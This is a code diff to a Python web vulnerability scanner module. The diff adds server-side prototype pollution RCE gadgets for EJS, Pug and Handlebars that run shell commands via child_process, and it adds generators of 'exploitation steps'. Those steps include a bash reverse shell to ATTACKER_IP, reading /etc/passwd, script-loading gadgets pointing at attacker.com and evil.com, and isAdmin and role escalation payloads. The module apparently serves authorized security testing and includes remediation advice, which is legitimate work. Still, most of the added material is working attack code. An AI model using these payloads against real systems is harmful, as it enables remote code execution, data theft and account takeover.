@@ -1,13 +1,13 @@
 """
-Prototype Pollution Scanner Module
+Prototype Pollution Scanner Module (Client-side + Server-side)
 
-Detects client-side and server-side prototype pollution vulnerabilities:
-1. Identifies vulnerable JavaScript libraries (jQuery BBQ, deparam, etc.)
-2. Tests prototype pollution payloads via query/hash/JSON
-3. Detects pollution through response analysis
+Detects prototype pollution vulnerabilities with strong proof:
+1. Client-side: URL/Hash/JSON pollution → DOM XSS via gadgets
+2. Server-side: Node.js RCE via EJS, Pug, Handlebars gadgets
 
-Based on BlackFan's client-side-prototype-pollution research:
+Based on BlackFan's research + PortSwigger prototype pollution research:
 https://github.com/BlackFan/client-side-prototype-pollution
+https://portswigger.net/research/server-side-prototype-pollution
 """
 
 from typing import List, Dict, Any, Set
@@ -16,6 +16,7 @@ from core.logger import get_logger
 from urllib.parse import urlparse, urlencode, parse_qs
 import re
 import json
+import time
 
 logger = get_logger(__name__)
 
@@ -106,11 +107,47 @@ class PrototypePollutionModule(BaseModule):
         '[object Object]',  # Prototype pollution side effect
     ]
 
+    # Server-side RCE gadgets for Node.js
+    SERVER_RCE_GADGETS = {
+        'ejs': {
+            'payload': {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('echo PP_MARKER')//"}},
+            'desc': 'EJS Template RCE',
+            'severity': 'critical'
+        },
+        'pug': {
+            'payload': {"__proto__": {"block": {"type": "Text", "val": "x;process.mainModule.require('child_process').execSync('echo PP_MARKER')//"}}},
+            'desc': 'Pug Template RCE',
+            'severity': 'critical'
+        },
+        'handlebars': {
+            'payload': {"__proto__": {"pendingContent": "x]];process.mainModule.require('child_process').execSync('echo PP_MARKER')//"}},
+            'desc': 'Handlebars RCE',
+            'severity': 'critical'
+        },
+        'status_code': {
+            'payload': {"__proto__": {"status": 510}},
+            'desc': 'Status code pollution',
+            'severity': 'high'
+        },
+        'json_spaces': {
+            'payload': {"__proto__": {"json spaces": "PP_MARKER"}},
+            'desc': 'Express JSON spaces pollution',
+            'severity': 'medium'
+        },
+        'content_type': {
+            'payload': {"__proto__": {"content-type": "application/x-www-form-urlencoded"}},
+            'desc': 'Content-Type pollution',
+            'severity': 'medium'
+        },
+    }
+
     def __init__(self, module_path: str, payload_limit: int = None):
         """Initialize Prototype Pollution module"""
         super().__init__(module_path, payload_limit=payload_limit)
         self.tested_urls: Set[str] = set()
-        logger.info(f"Prototype Pollution module loaded: {len(self.payloads)} payloads")
+        # Unique marker for detection
+        self.marker = f"PP{int(time.time()) % 100000}"
+        logger.info(f"Prototype Pollution module loaded: {len(self.payloads)} payloads, marker: {self.marker}")
 
     def scan(self, targets: List[Dict[str, Any]], http_client: Any) -> List[Dict[str, Any]]:
         """
@@ -143,9 +180,13 @@ class PrototypePollutionModule(BaseModule):
                 lib_findings = self._analyze_js_for_vulnerable_libs(url, http_client)
                 results.extend(lib_findings)
 
-            # Test prototype pollution payloads
+            # Test prototype pollution payloads (client-side)
             payload_findings = self._test_pollution_payloads(url, http_client)
             results.extend(payload_findings)
+
+            # Test server-side RCE gadgets (Node.js)
+            server_findings = self._test_server_side_rce(url, http_client)
+            results.extend(server_findings)
 
             # Early exit if we found vulnerabilities
             if results and self.config.get('early_exit', False):
@@ -295,6 +336,7 @@ class PrototypePollutionModule(BaseModule):
             pollution_detected, evidence = self._check_pollution_evidence(response.text, payload)
 
             if pollution_detected:
+                exploitation_steps = self._generate_client_pp_steps(url, 'query', payload)
                 return self.create_result(
                     vulnerable=True,
                     url=url,
@@ -302,7 +344,8 @@ class PrototypePollutionModule(BaseModule):
                     payload=payload,
                     evidence=evidence,
                     description=f"Prototype pollution via query parameter: {payload.split('=')[0]}",
-                    confidence=0.80
+                    confidence=0.80,
+                    exploitation_steps=exploitation_steps
                 )
 
         except Exception as e:
@@ -347,6 +390,7 @@ class PrototypePollutionModule(BaseModule):
                     )
 
             if pollution_detected:
+                exploitation_steps = self._generate_client_pp_steps(url, 'json', payload)
                 return self.create_result(
                     vulnerable=True,
                     url=url,
@@ -354,7 +398,8 @@ class PrototypePollutionModule(BaseModule):
                     payload=payload,
                     evidence=evidence,
                     description="Prototype pollution via JSON body",
-                    confidence=0.75
+                    confidence=0.75,
+                    exploitation_steps=exploitation_steps
                 )
 
         except json.JSONDecodeError:
@@ -363,6 +408,291 @@ class PrototypePollutionModule(BaseModule):
             logger.debug(f"Error testing JSON pollution: {e}")
 
         return None
+
+    def _test_server_side_rce(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
+        """Test server-side prototype pollution with RCE gadgets"""
+        results = []
+
+        # Test each server-side gadget
+        for gadget_name, gadget_info in self.SERVER_RCE_GADGETS.items():
+            try:
+                # Prepare payload with our marker
+                payload_template = gadget_info['payload']
+                payload_str = json.dumps(payload_template).replace('PP_MARKER', self.marker)
+                payload_json = json.loads(payload_str)
+
+                headers = {'Content-Type': 'application/json'}
+
+                # Send polluted request
+                response = http_client.post(url, json=payload_json, headers=headers)
+                if not response:
+                    continue
+
+                # Check for evidence of successful pollution
+                evidence = []
+                is_vulnerable = False
+                confidence = 0.0
+
+                # Check for marker reflection (RCE proof)
+                if self.marker in (response.text or ''):
+                    evidence.append(f"Marker '{self.marker}' reflected in response - RCE confirmed!")
+                    is_vulnerable = True
+                    confidence = 0.95
+
+                # Check for status code pollution
+                if gadget_name == 'status_code' and response.status_code == 510:
+                    evidence.append(f"Status code changed to 510 (polluted value)")
+                    is_vulnerable = True
+                    confidence = 0.90
+
+                # Check for JSON spaces pollution (Express)
+                if gadget_name == 'json_spaces':
+                    # Send a request that returns JSON to see if spacing changed
+                    try:
+                        test_resp = http_client.get(url)
+                        if test_resp and test_resp.text:
+                            if self.marker in test_resp.text:
+                                evidence.append("JSON spaces pollution detected")
+                                is_vulnerable = True
+                                confidence = 0.80
+                    except:
+                        pass
+
+                # Check for characteristic error messages
+                error_indicators = [
+                    ('outputFunctionName', 'EJS'),
+                    ('pendingContent', 'Handlebars'),
+                    ('child_process', 'Node.js RCE'),
+                    ('mainModule', 'Node.js RCE'),
+                    ('require', 'Module access'),
+                ]
+
+                resp_text = response.text or ''
+                for indicator, indicator_type in error_indicators:
+                    if indicator in resp_text.lower():
+                        evidence.append(f"Server reflected {indicator_type} keyword")
+                        if not is_vulnerable:
+                            is_vulnerable = True
+                            confidence = 0.70
+
+                # Check for 500 error with prototype-related message
+                if response.status_code == 500:
+                    proto_errors = ['prototype', '__proto__', 'constructor', 'cannot read', 'cannot set']
+                    for err in proto_errors:
+                        if err in resp_text.lower():
+                            evidence.append(f"Server error with prototype keyword: '{err}'")
+                            is_vulnerable = True
+                            confidence = max(confidence, 0.75)
+                            break
+
+                if is_vulnerable:
+                    # Generate exploitation steps
+                    exploitation_steps = self._generate_server_rce_steps(
+                        url, gadget_name, gadget_info, payload_json
+                    )
+
+                    result = self.create_result(
+                        vulnerable=True,
+                        url=url,
+                        parameter='JSON Body (__proto__)',
+                        payload=payload_str,
+                        evidence='\\n'.join(evidence),
+                        description=f"Server-side Prototype Pollution: {gadget_info['desc']}",
+                        confidence=confidence,
+                        exploitation_steps=exploitation_steps
+                    )
+                    result['cwe'] = 'CWE-1321'
+                    result['severity'] = gadget_info['severity']
+                    result['gadget'] = gadget_name
+                    result['recommendation'] = (
+                        'Sanitize all user input before merging into objects. '
+                        'Use Object.create(null) for safe objects. '
+                        'Block __proto__, constructor, and prototype keys. '
+                        'Update vulnerable libraries (lodash, merge-deep, etc).'
+                    )
+                    results.append(result)
+
+                    # Found critical RCE - can stop testing this gadget category
+                    if gadget_info['severity'] == 'critical':
+                        break
+
+            except Exception as e:
+                logger.debug(f"Error testing {gadget_name} gadget: {e}")
+
+        return results
+
+    def _generate_server_rce_steps(self, url: str, gadget_name: str, gadget_info: Dict, payload: Dict) -> List[str]:
+        """Generate exploitation steps for server-side prototype pollution"""
+        steps = []
+
+        steps.append(f"=== Server-Side Prototype Pollution Exploitation ({gadget_info['desc']}) ===")
+        steps.append(f"Target: {url}")
+        steps.append("")
+
+        if gadget_name in ['ejs', 'pug', 'handlebars']:
+            steps.append("STEP 1: Confirm RCE Capability")
+            steps.append("Send this payload via JSON POST:")
+            steps.append(f"```")
+            steps.append(f"POST {url}")
+            steps.append(f"Content-Type: application/json")
+            steps.append(f"")
+            steps.append(json.dumps(payload, indent=2))
+            steps.append(f"```")
+            steps.append("")
+
+            steps.append("STEP 2: Execute Commands (CAUTION - for authorized testing only)")
+            if gadget_name == 'ejs':
+                rce_payload = {
+                    "__proto__": {
+                        "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"
+                    }
+                }
+            elif gadget_name == 'pug':
+                rce_payload = {
+                    "__proto__": {
+                        "block": {
+                            "type": "Text",
+                            "val": "x;process.mainModule.require('child_process').execSync('id');//"
+                        }
+                    }
+                }
+            else:  # handlebars
+                rce_payload = {
+                    "__proto__": {
+                        "pendingContent": "x]];process.mainModule.require('child_process').execSync('id');//"
+                    }
+                }
+
+            steps.append(f"```json")
+            steps.append(json.dumps(rce_payload, indent=2))
+            steps.append(f"```")
+            steps.append("")
+
+            steps.append("STEP 3: Reverse Shell (Authorized Testing Only)")
+            steps.append("Replace command with: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")
+            steps.append("")
+
+            steps.append("STEP 4: Alternative - Read Sensitive Files")
+            steps.append(f"Change execSync to: cat /etc/passwd")
+            steps.append(f"Or for Windows: type C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts")
+
+        elif gadget_name == 'status_code':
+            steps.append("STEP 1: Confirm Status Code Pollution")
+            steps.append(f"```json")
+            steps.append(json.dumps({"__proto__": {"status": 510}}, indent=2))
+            steps.append(f"```")
+            steps.append("")
+            steps.append("STEP 2: Impact Assessment")
+            steps.append("- Can manipulate application logic dependent on status codes")
+            steps.append("- May bypass security controls checking response status")
+            steps.append("- Potential for cache poisoning via status manipulation")
+
+        elif gadget_name == 'json_spaces':
+            steps.append("STEP 1: Confirm JSON Spaces Pollution")
+            steps.append(f"```json")
+            steps.append(json.dumps({"__proto__": {"json spaces": 10}}, indent=2))
+            steps.append(f"```")
+            steps.append("")
+            steps.append("STEP 2: Escalate - Try Express Options Pollution")
+            steps.append("Test other Express options: 'x-powered-by', 'etag', 'views'")
+
+        elif gadget_name == 'content_type':
+            steps.append("STEP 1: Confirm Content-Type Pollution")
+            steps.append(f"```json")
+            steps.append(json.dumps(payload, indent=2))
+            steps.append(f"```")
+            steps.append("")
+            steps.append("STEP 2: Impact - Response Type Manipulation")
+            steps.append("- Can change how server interprets subsequent requests")
+            steps.append("- May enable parameter pollution or injection attacks")
+
+        steps.append("")
+        steps.append("=== Additional Test Payloads ===")
+        steps.append("Constructor notation (bypasses some filters):")
+        steps.append('{"constructor": {"prototype": {"isAdmin": true}}}')
+        steps.append("")
+        steps.append("Nested pollution:")
+        steps.append('{"__proto__": {"__proto__": {"polluted": true}}}')
+
+        return steps
+
+    def _generate_client_pp_steps(self, url: str, vector_type: str, payload: str) -> List[str]:
+        """Generate exploitation steps for client-side prototype pollution"""
+        steps = []
+
+        steps.append(f"=== Client-Side Prototype Pollution Exploitation ===")
+        steps.append(f"Target: {url}")
+        steps.append(f"Vector: {vector_type.upper()}")
+        steps.append("")
+
+        if vector_type == 'query':
+            steps.append("STEP 1: Reproduce the Pollution")
+            steps.append(f"Open browser and navigate to:")
+            steps.append(f"  {url}?{payload}")
+            steps.append("")
+            steps.append("STEP 2: Verify Pollution in Browser Console")
+            steps.append("Open DevTools (F12) → Console, then run:")
+            steps.append("  ({}).polluted")
+            steps.append("If returns our value, pollution successful!")
+            steps.append("")
+            steps.append("STEP 3: DOM XSS via Known Gadgets")
+            steps.append("jQuery $.ajax gadget:")
+            steps.append(f"  {url}?__proto__[url]=//attacker.com/xss.js&__proto__[dataType]=script")
+            steps.append("")
+            steps.append("jQuery $.get gadget:")
+            steps.append(f"  {url}?__proto__[src]=data:,alert(1)//")
+            steps.append("")
+            steps.append("Vue.js gadget:")
+            steps.append(f"  {url}?__proto__[v-html]=<img src=x onerror=alert(1)>")
+            steps.append("")
+            steps.append("STEP 4: Account Takeover via isAdmin")
+            steps.append(f"  {url}?__proto__[isAdmin]=true")
+            steps.append(f"  {url}?__proto__[role]=admin")
+            steps.append("")
+
+        elif vector_type == 'json':
+            steps.append("STEP 1: Reproduce via Fetch/XHR")
+            steps.append("```javascript")
+            steps.append(f"fetch('{url}', {{")
+            steps.append("  method: 'POST',")
+            steps.append("  headers: {'Content-Type': 'application/json'},")
+            steps.append(f"  body: '{payload}'")
+            steps.append("});")
+            steps.append("```")
+            steps.append("")
+            steps.append("STEP 2: Test for Persistent Pollution")
+            steps.append("After sending payload, check if Object.prototype is polluted:")
+            steps.append("  ({}).polluted")
+            steps.append("")
+            steps.append("STEP 3: Common JSON Payloads")
+            steps.append('{"__proto__": {"isAdmin": true}}')
+            steps.append('{"constructor": {"prototype": {"isLoggedIn": true}}}')
+            steps.append('{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}')
+            steps.append("")
+
+        elif vector_type == 'hash':
+            steps.append("STEP 1: Test Hash-based Pollution")
+            steps.append(f"  {url}#__proto__[polluted]=true")
+            steps.append(f"  {url}#constructor.prototype.polluted=true")
+            steps.append("")
+            steps.append("STEP 2: Verify in Console")
+            steps.append("  ({}).polluted // should return 'true'")
+            steps.append("")
+
+        steps.append("=== Known Vulnerable Libraries ===")
+        steps.append("- jQuery BBQ/deparam (parses hash)")
+        steps.append("- Lodash merge (< 4.17.5)")
+        steps.append("- deep-extend")
+        steps.append("- qs (< 6.3.0)")
+        steps.append("- url-parse (< 1.4.3)")
+        steps.append("")
+        steps.append("=== Useful Gadgets Cheatsheet ===")
+        steps.append("Bypass sanitizers: __proto__[ALLOW_DATA_ATTR]=true")
+        steps.append("jQuery script load: __proto__[url]=//evil.com/xss.js")
+        steps.append("Google Closure: __proto__[CLOSURE_BASE_PATH]=//evil.com/")
+        steps.append("Segment Analytics: __proto__[cdn]=//evil.com")
+
+        return steps
 
     def _check_pollution_evidence(self, response_text: str, payload: str) -> tuple:
         """Check response for evidence of successful pollution"""
